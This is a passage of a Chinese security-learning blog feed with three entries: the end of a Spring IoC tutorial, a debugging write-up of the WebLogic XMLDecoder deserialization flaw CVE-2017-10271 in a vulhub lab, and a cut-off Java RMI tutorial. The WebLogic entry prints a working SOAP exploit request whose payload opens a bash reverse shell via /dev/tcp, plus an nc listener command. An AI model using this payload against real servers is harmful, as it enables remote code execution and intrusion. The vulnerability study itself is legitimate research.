class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>   </span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span>  </span></span><br><span class="line"><span class="tag"><span class="attr">xmlns</span>=<span class="string">"http://www.springframework.org/schema/beans"</span>  </span></span><br><span class="line"><span class="tag"><span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span>   </span></span><br><span class="line"><span class="tag"><span class="attr">xmlns:context</span>=<span class="string">"http://www.springframework.org/schema/context"</span>  </span></span><br><span class="line"><span class="tag"><span class="attr">xmlns:p</span>=<span class="string">"http://www.springframework.org/schema/p"</span>  </span></span><br><span class="line"><span class="tag"><span class="attr">xsi:schemaLocation</span>=<span class="string">"http://www.springframework.org/schema/beans   </span></span></span><br><span class="line"><span class="tag"><span class="string">http://www.springframework.org/schema/beans/spring-beans-2.5.xsd  </span></span></span><br><span class="line"><span class="tag"><span class="string">http://www.springframework.org/schema/context   </span></span></span><br><span class="line"><span class="tag"><span class="string">http://www.springframework.org/schema/context/spring-context-2.5.xsd  </span></span></span><br><span class="line"><span class="tag"><span class="string">"</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Spring配置隐式的注册了多个对注释进行解析的处理器,例如：</p><ul><li>AutowiredAnnotationBeanPostProcessor</li><li>CommonAnnotationBeanPostProcessor</li><li>PersistenceAnnotationBeanPostProcessor</li></ul><p>在配置文件中打开<a href="context:annotation-config">context:annotation-config</a>节点，告诉Spring容器可以用注解的方式注入依赖对象；其在配置文件中的代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;beans&gt;&lt;context:annotation-config&gt;&lt;&#x2F;context:annotation-config&gt;&lt;&#x2F;beans&gt;</span><br></pre></td></tr></table></figure><p>在配置文件中配置bean对象，如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"userDao"</span> <span class="attr">class</span>=<span class="string">"com.springtest.dao.impl.UserDAOImpl"</span>&gt;</span><span class="tag">&lt;/<span class="name">bean</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"userBiz"</span> <span class="attr">class</span>=<span class="string">"com.springtest.biz.impl.UserBizImpl"</span>&gt;</span><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure><p>最后，在需要依赖注入的类中，声明一个依赖对象，不用生成该依赖对象的setter方法，并且为该对象添加注解：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserBizImpl</span> <span class="keyword">implements</span> <span class="title">UserBiz</span> </span>&#123;  </span><br><span class="line">   <span class="meta">@Resource</span>(name=<span class="string">"userDao"</span>)  </span><br><span class="line">   <span class="keyword">private</span> UserDAO userDao = <span class="keyword">null</span>; </span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addUser</span><span class="params">()</span> </span>&#123;  </span><br><span class="line">          <span class="keyword">this</span>.userDao.addUser();  </span><br><span class="line">   &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>@Autowired默认按类型装配，@Resource默认按名称装配，当找不到与名称匹配的bean时，才会按类型装配。</p><h4 id="控制反转与依赖注入的区别"><a href="#控制反转与依赖注入的区别" class="headerlink" title="控制反转与依赖注入的区别"></a>控制反转与依赖注入的区别</h4><p>依赖注入和控制反转是对同一件事情的不同描述，</p><ul><li><p>依赖注入是从应用程序的角度在描述：应用程序依赖容器创建并注入它所需要的外部资源;</p></li><li><p>控制反转是从容器的角度在描述:容器控制应用程序，由容器反向的向应用程序注入应用程序所需要的外部资源。</p></li></ul><h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://juejin.cn/post/6844903813753602056" target="_blank" rel="noopener">Spring注入Bean的几种方式 (juejin.cn)</a></p><p><a href="https://www.yisu.com/zixun/207582.html" target="_blank" rel="noopener">详解Spring中bean的几种注入方式 - 编程语言 - 亿速云 (yisu.com)</a></p><p><a href="https://www.w3cschool.cn/wkspring" target="_blank" rel="noopener">https://www.w3cschool.cn/wkspring</a></p><p><a href="https://blog.csdn.net/zhangzeyuaaa/article/details/22588459" target="_blank" rel="noopener">(15条消息) Spring Bean自动装配和注解注入_似水流年-CSDN博客</a></p><p><a href="https://zhuanlan.zhihu.com/p/104519509" target="_blank" rel="noopener">小白也看得懂的 Spring IoC 核心流程介绍 - 知乎 (zhihu.com)</a></p><p><a href="https://www.jianshu.com/p/6253726f239d" target="_blank" rel="noopener">Spring IOC原理总结 - 简书 (jianshu.com)</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Spring框架基础学习&quot;&gt;&lt;a href=&quot;#Spring框架基础学习&quot; class=&quot;headerlink&quot; title=&quot;Spring框架基础学习&quot;&gt;&lt;/a&gt;Spring框架基础学习&lt;/h2&gt;&lt;h3 id=&quot;Spring–IOC&quot;&gt;&lt;a href=&quot;#Spr
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>WebLogic XMLDecoder反序列化漏洞学习</title>
    <link href="https://shu1l.github.io/2021/02/09/weblogic-xmldecoder-fan-xu-lie-hua-lou-dong-xue-xi/"/>
    <id>https://shu1l.github.io/2021/02/09/weblogic-xmldecoder-fan-xu-lie-hua-lou-dong-xue-xi/</id>
    <published>2021-02-08T17:16:21.000Z</published>
    <updated>2021-02-08T17:31:58.146Z</updated>
    
    <content type="html"><![CDATA[<h1 id="WebLogic-XMLDecoder反序列化漏洞"><a href="#WebLogic-XMLDecoder反序列化漏洞" class="headerlink" title="WebLogic XMLDecoder反序列化漏洞"></a>WebLogic XMLDecoder反序列化漏洞</h1><h3 id="weblogic简介"><a href="#weblogic简介" class="headerlink" title="weblogic简介"></a>weblogic简介</h3><p>​        Weblogic是美国Oracle公司出品的一个应用服务器(application server)，确切的说是一个基于Java EE架构的中间件，是用于开发、集成、部署和管理大型分布式Web应用、网络应用和 数据库应用的Java应用服务器。<br>​        Weblogic将Java的动态功能和Java Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中，是商业市场上主要的Java（Java EE）应用服务器软件之一，也是世界上第一个成功商业化的Java EE应用服务器，具有可扩展性、快速开发、灵活、可靠等优势。</p><h4 id="版本"><a href="#版本" class="headerlink" title="版本"></a>版本</h4><p>一般使用的是10.3.6，这两个大版本也叫WebLogic Server 11g和WebLogic Server 12c。</p><h3 id="CVE-2017-10271"><a href="#CVE-2017-10271" class="headerlink" title="CVE-2017-10271"></a>CVE-2017-10271</h3><h4 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h4><p>​    weblogic “wls-wsat”组件在反序列化操作时使用了Oracle官方的JDK组件中”XMLDecoder”类进行XML反序列化操作引发了代码执行。</p><p>XMLDecoder类用于读取使用XMLEncoder创建的XML文档</p><p><img src="QQ%E6%88%AA%E5%9B%BE20210206135828.png" alt=""></p><p><img src="QQ%E6%88%AA%E5%9B%BE20210206135902.png" alt=""></p><p><img src="QQ%E6%88%AA%E5%9B%BE20210206135929.png" alt=""></p><h4 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h4><p>使用vulhub中的docker搭建复现环境，搭建环境可以参考<a href="https://vulhub.org/#/docs/" target="_blank" rel="noopener">https://vulhub.org/#/docs/</a></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//gi</span>thub.com<span class="regexp">/vulhub/</span>vulhub<span class="regexp">/blob/m</span>aster<span class="regexp">/weblogic/</span>CVE-<span class="number">2017</span>-<span class="number">10271</span></span><br></pre></td></tr></table></figure><p>因为要动态调试，需要开启一个远程调试的端口8053，所以将docker-compose.yml文件改动如下</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">version:</span> <span class="string">'2'</span><span class="string">services:</span>  </span><br><span class="line"><span class="string">weblogic:</span>    <span class="string">image:</span> vulhub/weblogic   </span><br><span class="line"><span class="string">ports:</span>     </span><br><span class="line">- <span class="string">"7001:7001"</span>     </span><br><span class="line">- <span class="string">"8453:8453"</span></span><br></pre></td></tr></table></figure><p><img src="QQ%E6%88%AA%E5%9B%BE20210206141422.png" alt=""></p><h4 id="IDEA远程调试"><a href="#IDEA远程调试" class="headerlink" title="IDEA远程调试"></a>IDEA远程调试</h4><p>,关于Weblogic的远程调试方法可以参考:</p><p><a href="https://github.com/Maskhe/javasec/blob/master/IDEA%E8%B0%83%E8%AF%95%E6%8A%80%E5%B7%A72%E2%80%94%E2%80%94%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95.md" target="_blank" rel="noopener">https://github.com/Maskhe/javasec/blob/master/IDEA%E8%B0%83%E8%AF%95%E6%8A%80%E5%B7%A72%E2%80%94%E2%80%94%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95.md</a></p><p>使用idea打开拷贝出的项目文件，将项目中的/server/lib和modules这两个文件夹添加到library。</p><p>添加后，就会发现里面的.jar和.war的包都可以点开了，并且可以搜索里面的一些类和字符串了。</p><p><img src="QQ%E6%88%AA%E5%9B%BE20210207180841.png" alt=""></p><p>然后我们在idea中设置remote debug，然后点击右上方的debug，出现如下字样，说明已经配置ok。</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Connected <span class="keyword">to</span> the target VM, addres<span class="variable">s:</span> <span class="string">'localhost:8453'</span>, transpor<span class="variable">t:</span> <span class="string">'socket'</span></span><br></pre></td></tr></table></figure><p><img src="QQ%E6%88%AA%E5%9B%BE20210207125332.png" alt=""></p><h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>首先我们复现一下漏洞,在response中我们可以看到命令执行的调用栈。</p><p>首先我们开一个nc监听。</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp <span class="number">8888</span></span><br></pre></td></tr></table></figure><p>然后直接拿vulhub上的poc打:</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/wls-wsat/CoordinatorPortType</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: your-ip:7001</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span>: */*</span><br><span class="line"><span class="attribute">Accept-Language</span>: en</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Content-Type</span>: text/xml</span><br><span class="line"><span class="attribute">Content-Length</span>: 633</span><br><span class="line"></span><br><span class="line">&lt;soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"&gt; &lt;soapenv:Header&gt;</span><br><span class="line">&lt;work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"&gt;</span><br><span class="line">&lt;java version="1.4.0" class="java.beans.XMLDecoder"&gt;</span><br><span class="line">&lt;void class="java.lang.ProcessBuilder"&gt;</span><br><span class="line">&lt;array class="java.lang.String" length="3"&gt;</span><br><span class="line">&lt;void index="0"&gt;</span><br><span class="line">&lt;string&gt;/bin/bash&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;void index="1"&gt;</span><br><span class="line">&lt;string&gt;-c&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;void index="2"&gt;</span><br><span class="line">&lt;string&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.111.134/4444 0&amp;gt;&amp;amp;1&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;/array&gt;</span><br><span class="line">&lt;void method="start"/&gt;&lt;/void&gt;</span><br><span class="line">&lt;/java&gt;</span><br><span class="line">&lt;/work:WorkContext&gt;</span><br><span class="line">&lt;/soapenv:Header&gt;</span><br><span class="line">&lt;soapenv:Body/&gt;</span><br><span class="line">&lt;/soapenv:Envelope&gt;</span><br></pre></td></tr></table></figure><p>反弹shell成功</p><p><img src="QQ%E6%88%AA%E5%9B%BE20210207143625.png" alt=""></p><p>通过查看response中的xml数据，我们可以在&lt;ns2:frame /&gt;标签中看到调用栈。</p><p><img src="QQ%E6%88%AA%E5%9B%BE20210207143937.png" alt=""></p><p>其中重要的调用栈有如下一些方法:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">-</span> <span class="selector-tag">weblogic</span><span class="selector-class">.wsee</span><span class="selector-class">.jaxws</span><span class="selector-class">.workcontext</span><span class="selector-class">.WorkContextServerTube-</span>&gt;<span class="selector-tag">processRequest</span></span><br><span class="line"><span class="selector-tag">-</span> <span class="selector-tag">weblogic</span><span class="selector-class">.wsee</span><span class="selector-class">.jaxws</span><span class="selector-class">.workcontext</span><span class="selector-class">.WorkContextTube-</span>&gt;<span class="selector-tag">readHeaderOld</span></span><br><span class="line"><span class="selector-tag">-</span> <span class="selector-tag">weblogic</span><span class="selector-class">.wsee</span><span class="selector-class">.jaxws</span><span class="selector-class">.workcontext</span><span class="selector-class">.WorkContextServerTube-</span>&gt;<span class="selector-tag">receive</span></span><br><span class="line"><span class="selector-tag">-</span> <span class="selector-tag">weblogic</span><span class="selector-class">.workarea</span><span class="selector-class">.WorkContextMapImpl-</span>&gt;<span class="selector-tag">receiveRequest</span></span><br><span class="line"><span class="selector-tag">-</span> <span class="selector-tag">weblogic</span><span class="selector-class">.workarea</span><span class="selector-class">.WorkContextLocalMap-</span>&gt;<span class="selector-tag">receiveRequest</span></span><br><span class="line"><span class="selector-tag">-</span> <span class="selector-tag">weblogic</span><span class="selector-class">.workarea</span><span class="selector-class">.spi</span><span class="selector-class">.WorkContextEntryImpl-</span>&gt;<span class="selector-tag">readEntry</span></span><br><span class="line"><span class="selector-tag">-</span> <span class="selector-tag">weblogic</span><span class="selector-class">.wsee</span><span class="selector-class">.workarea</span><span class="selector-class">.WorkContextXmlInputAdapter-</span>&gt;<span class="selector-tag">readUTF</span></span><br></pre></td></tr></table></figure><p>我们接下来就根据上面复现得到的调用栈进行跟踪调试。</p><h3 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h3><p>根据poc找到问题出在<code>wls-wsat</code>，然后找到对应的wls-wsat.war包，打开后点击<code>web.xml</code>查看有哪些接口</p><p><img src="QQ%E6%88%AA%E5%9B%BE20210206220029.png" alt=""></p><p>然后我们直接跟踪调用栈的第一个processRequest 方法。</p><h4 id="weblogic-wsee-jaxws-workcontext-WorkContextServerTube"><a href="#weblogic-wsee-jaxws-workcontext-WorkContextServerTube" class="headerlink" title="weblogic.wsee.jaxws.workcontext.WorkContextServerTube"></a>weblogic.wsee.jaxws.workcontext.WorkContextServerTube</h4><p><img src="QQ%E6%88%AA%E5%9B%BE20210207130022.png" alt=""></p><p>   这里的var1是传进来的XML数据。var3是soap头部解析的结果 不为空 于是 跟入readHeaderOld。</p><h3 id="weblogic-wsee-jaxws-workcontext-WorkContextTube"><a href="#weblogic-wsee-jaxws-workcontext-WorkContextTube" class="headerlink" title="weblogic.wsee.jaxws.workcontext.WorkContextTube"></a>weblogic.wsee.jaxws.workcontext.WorkContextTube</h3><p><img src="QQ%E6%88%AA%E5%9B%BE20210207130400.png" alt=""></p><p>在此方法中实例化了WorkContextXmlInputAdapter类，并且将获取到的XML格式的序列化数据传递到此类的构造方法中，之后跟进receive()</p><h3 id="weblogic-wsee-jaxws-workcontext-WorkContextServerTube-1"><a href="#weblogic-wsee-jaxws-workcontext-WorkContextServerTube-1" class="headerlink" title="weblogic.wsee.jaxws.workcontext.WorkContextServerTube"></a>weblogic.wsee.jaxws.workcontext.WorkContextServerTube</h3><p>var2获取一个WorkContextMapImpl实例，然后调用receiveRequest方法将var1值传入。</p><p><img src="QQ%E6%88%AA%E5%9B%BE20210207181022.png" alt=""></p><p>继续跟进receiveRequest()</p><h3 id="weblogic-workarea-WorkContextMapImpl"><a href="#weblogic-workarea-WorkContextMapImpl" class="headerlink" title="weblogic.workarea.WorkContextMapImpl"></a>weblogic.workarea.WorkContextMapImpl</h3><p><img src="QQ%E6%88%AA%E5%9B%BE20210207181140.png" alt=""></p><p>将var1传到了receiveRequest()方法中，继续跟进</p><h3 id="weblogic-workarea-WorkContextLocalMap"><a href="#weblogic-workarea-WorkContextLocalMap" class="headerlink" title="weblogic.workarea.WorkContextLocalMap"></a>weblogic.workarea.WorkContextLocalMap</h3><p><img src="QQ%E6%88%AA%E5%9B%BE20210207131058.png" alt=""></p><p><code>WorkContextEntryImpl.readEntry(var1);</code>对传进来的数据进行处理，具体的代码好像看不太懂，但是跟进！readEntry()！</p><h3 id="weblogic-workarea-spi-WorkContextEntryImpl"><a href="#weblogic-workarea-spi-WorkContextEntryImpl" class="headerlink" title="weblogic.workarea.spi.WorkContextEntryImpl"></a>weblogic.workarea.spi.WorkContextEntryImpl</h3><p><img src="QQ%E6%88%AA%E5%9B%BE20210207131154.png" alt=""></p><p>继续跟进readUTF()：</p><h3 id="weblogic-wsee-workarea-WorkContextXmlInputAdapter"><a href="#weblogic-wsee-workarea-WorkContextXmlInputAdapter" class="headerlink" title="weblogic.wsee.workarea.WorkContextXmlInputAdapter"></a>weblogic.wsee.workarea.WorkContextXmlInputAdapter</h3><p><img src="QQ%E6%88%AA%E5%9B%BE20210207131435.png" alt=""></p><p>在这里就执行了this.xmlDecoder.readObject()，对XMLDecoder对象进行了反序列化，导致RCE。</p><h4 id="调用栈总结"><a href="#调用栈总结" class="headerlink" title="调用栈总结"></a>调用栈总结</h4><p><img src="QQ%E6%88%AA%E5%9B%BE20210207183630.png" alt=""></p><h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://hu3sky.github.io/2019/10/16/weblogic/#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90" target="_blank" rel="noopener">https://hu3sky.github.io/2019/10/16/weblogic/#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90</a></p><p><a href="http://www.wxylyw.com/2018/11/03/WebLogic-XMLDecoder%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">http://www.wxylyw.com/2018/11/03/WebLogic-XMLDecoder%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</a></p><p><a href="https://www.jianshu.com/p/5493f63fd7a0" target="_blank" rel="noopener">https://www.jianshu.com/p/5493f63fd7a0</a></p><p><a href="https://github.com/Maskhe/javasec/blob/master/Weblogic%E4%B9%8BXMLDecoder%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%961%EF%BC%88CVE-2017-3506).md" target="_blank" rel="noopener">https://github.com/Maskhe/javasec/blob/master/Weblogic%E4%B9%8BXMLDecoder%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%961%EF%BC%88CVE-2017-3506).md</a></p><p><a href="https://vulhub.org/#/environments/weblogic/CVE-2017-10271/" target="_blank" rel="noopener">https://vulhub.org/#/environments/weblogic/CVE-2017-10271/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;WebLogic-XMLDecoder反序列化漏洞&quot;&gt;&lt;a href=&quot;#WebLogic-XMLDecoder反序列化漏洞&quot; class=&quot;headerlink&quot; title=&quot;WebLogic XMLDecoder反序列化漏洞&quot;&gt;&lt;/a&gt;WebLogic XM
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>Java安全--RMI基础学习</title>
    <link href="https://shu1l.github.io/2021/02/09/java-an-quan-rmi-ji-chu-xue-xi/"/>
    <id>https://shu1l.github.io/2021/02/09/java-an-quan-rmi-ji-chu-xue-xi/</id>
    <published>2021-02-08T17:12:01.000Z</published>
    <updated>2021-04-02T11:18:47.610Z</updated>
    
    <content type="html"><![CDATA[<h2 id="java安全学习–RMI学习"><a href="#java安全学习–RMI学习" class="headerlink" title="java安全学习–RMI学习"></a>java安全学习–RMI学习</h2><h3 id="RMI定义"><a href="#RMI定义" class="headerlink" title="RMI定义"></a>RMI定义</h3><ul><li>Java远程调用，<strong>实现远程调用的应用程序编程接口</strong>。</li><li>RMI对象是通过<strong>序列化方式</strong>进行编码传输的。</li><li>Java程序远程调用另一台服务器的java对象。</li><li>RMI依赖的通信协议 JRMP。</li></ul><h3 id="RMI实现流程"><a href="#RMI实现流程" class="headerlink" title="RMI实现流程"></a>RMI实现流程</h3><p><img src="4f14ac03-3aa6-4f9b-9eff-acf8551e5efb.png-w331s" alt="img"></p><h4 id="1-创建接口"><a href="#1-创建接口" class="headerlink" title="1.创建接口"></a>1.创建接口</h4><p>在创建对象类之前，我们首先需要创建一个空接口，接口需要继承<code>java.rmi.Remote</code>。</p><p><img src="QQ%E6%88%AA%E5%9B%BE20210204205736.png" alt=""></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line">public<span class="built_in"> interface </span>Services extends java.rmi.Remote &#123;</span><br><span class="line">    Object sendMessage(Message msg) throws RemoteException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-实现接口"><a href="#2-实现接口" class="headerlink" title="2.实现接口"></a>2.实现接口</h4><p>接着我们实现这个接口，创建服务端对象类，实现的类必须继承UnicastRmeoteObject。</p><p><img src="QQ%E6%88%AA%E5%9B%BE20210204205829.png" alt=""></p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.<span class="type">RemoteException</span>;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.<span class="type">UnicastRemoteObject</span>;</span><br><span class="line"></span><br><span class="line">public <span class="class"><span class="keyword">class</span> <span class="title">ServicesImpl</span> <span class="keyword">extends</span> <span class="title">UnicastRemoteObject</span> <span class="title">implements</span> <span class="title">Services</span> </span>&#123;</span><br><span class="line">    public <span class="type">ServicesImpl</span>() <span class="keyword">throws</span> <span class="type">RemoteException</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    public <span class="type">Object</span> sendMessage(<span class="type">Message</span> msg) <span class="keyword">throws</span> <span class="type">RemoteException</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> msg.getMessage();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="3-创建服务端-amp-amp-注册中心"><a href="#3-创建服务端-amp-amp-注册中心" class="headerlink" title="3.创建服务端&amp;&amp;注册中心"></a>3.创建服务端&amp;&amp;注册中心</h4><p>创建一个RMI服务端，服务端和客户端需要有共同的接口。然后创建注册中心，启动 <code>RMI</code> 的注册服务。<strong>server端将实例化的服务端远程对象绑定到registry</strong></p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"><span class="meta-keyword">import</span> java.rmi.AlreadyBoundException;</span></span><br><span class="line"><span class="meta"><span class="meta-keyword">import</span> java.rmi.RemoteException;</span></span><br><span class="line"><span class="meta"><span class="meta-keyword">import</span> java.rmi.registry.LocateRegistry;</span></span><br><span class="line"><span class="meta"><span class="meta-keyword">import</span> java.rmi.registry.Registry;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RMIServer</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> main(String[] args) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 实例化服务端远程对象</span></span><br><span class="line">            ServicesImpl obj = <span class="keyword">new</span> ServicesImpl();</span><br><span class="line">            Registry registry = <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">// 创建Registry</span></span><br><span class="line">                registry = LocateRegistry.createRegistry(<span class="number">9999</span>);</span><br><span class="line">                System.out.println(<span class="string">"java RMI registry created. port on 9999..."</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                System.out.println(<span class="string">"Using existing registry"</span>);</span><br><span class="line">                registry = LocateRegistry.getRegistry();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//绑定远程对象到Registry</span></span><br><span class="line">            registry.bind(<span class="string">"Services"</span>, obj);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RemoteException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (AlreadyBoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="QQ%E6%88%AA%E5%9B%BE20210204205801.png" alt=""></p><p><strong>注意:</strong>低版本的JDK中，server服务端和register注册中心可以不在一台服务器上，高版本则只能在一台服务器上。</p><h4 id="4-创建客户端"><a href="#4-创建客户端" class="headerlink" title="4.创建客户端"></a>4.创建客户端</h4><p>客户端与server和registry交互。</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">package me.mole.javarmi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RMIClient</span> &#123;</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">String</span>[] args)</span> throws Exception </span>&#123;</span><br><span class="line">        Registry registry = LocateRegistry.getRegistry(<span class="string">"127.0.0.1"</span>, <span class="number">9999</span>);</span><br><span class="line">        <span class="comment">// 获取远程对象的引用</span></span><br><span class="line">        Services services = (Services) registry.lookup(<span class="string">"Services"</span>);</span><br><span class="line">        VulObject malicious = <span class="keyword">new</span> VulObject();</span><br><span class="line">        malicious.setParam(<span class="string">"calc.exe"</span>);</span><br><span class="line">        malicious.setMessage(<span class="string">"hacked by m01e"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 使用远程对象的引用调用对应的方法</span></span><br><span class="line">        System.out.<span 